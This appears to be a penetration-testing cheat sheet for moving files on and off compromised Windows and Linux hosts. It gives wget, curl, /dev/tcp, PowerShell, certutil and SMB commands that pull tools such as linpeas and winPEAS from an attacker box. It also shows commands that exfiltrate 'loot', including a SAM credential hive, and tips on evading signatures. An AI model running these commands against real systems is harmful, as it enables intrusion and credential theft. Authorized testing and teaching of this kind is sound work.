---
tool: File transfer
slug: file-transfer
kind: technique
stages: [delivery]
category: Getting files on and off a host
platforms: [windows, linux]
services: [http, smb]
ports: [80, 445, 8000]
tags: [file-transfer, download, upload, exfil, living-off-the-land, smbserver]
attack: [T1105, T1570]
summary: Moving tools in and loot out, once you can run commands. The reliable ways to transfer files to and from Windows and Linux hosts, built around a web server or an SMB share you host from your attacking box.
references:
  - Impacket smbserver | https://github.com/fortra/impacket/blob/master/examples/smbserver.py
  - Python http.server | https://docs.python.org/3/library/http.server.html
---

## When to reach for it

You have command execution and need to get a tool onto the target (a privesc script, a static binary) or pull a file back (a hash dump, a config, proof). Stand up a server on your box, then fetch or push from the target with whatever it already has.

## Host a server on your attacking box

```bash
# Serve the current directory over HTTP (both OSes can fetch from this)
python3 -m http.server 8000

# Serve it over SMB instead (handy for Windows; -smb2support for modern clients)
impacket-smbserver share "$(pwd)" -smb2support

# Authenticated SMB share (some Windows versions refuse guest access)
impacket-smbserver share "$(pwd)" -smb2support -user pt -password pt
```

## Download to a Linux target

```bash
wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://10.10.14.5:8000/tool -o /tmp/tool
# No wget or curl? Bash's own /dev/tcp
exec 3<>/dev/tcp/10.10.14.5/8000; echo -e "GET /tool HTTP/1.0\r\n\r" >&3; cat <&3 > /tmp/tool
```

## Download to a Windows target

```powershell
# PowerShell: the modern way
iwr -Uri http://10.10.14.5:8000/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
# PowerShell: older / more compatible
(New-Object Net.WebClient).DownloadFile("http://10.10.14.5:8000/wp.exe","C:\Windows\Temp\wp.exe")
# certutil (lives on the box; noisy and often flagged)
certutil -urlcache -split -f http://10.10.14.5:8000/wp.exe C:\Windows\Temp\wp.exe
# From an SMB share you host
copy \\10.10.14.5\share\wp.exe C:\Windows\Temp\wp.exe
```

## Upload loot back to your box

```bash
# Linux target -> your HTTP server needs an upload handler; SMB is simpler:
smbclient //10.10.14.5/share -U pt%pt -c 'put /tmp/loot.tar.gz'
# Or over the SMB share mounted by the target
curl -T /tmp/loot.tar.gz http://10.10.14.5:8000/     # if your server accepts PUT
```

```powershell
# Windows target -> copy to the SMB share you are hosting
copy C:\Windows\Temp\sam.hive \\10.10.14.5\share\sam.hive
```

## Notes

`certutil` and `bitsadmin` are heavily signatured — prefer PowerShell `iwr` or an SMB share on a monitored host. SMB out to the internet is usually blocked, so SMB transfer is for the internal leg; HTTP(S) is more likely to egress. Clean up anything you drop, and keep transfers inside the engagement scope. Note the file's path and hash for the report.
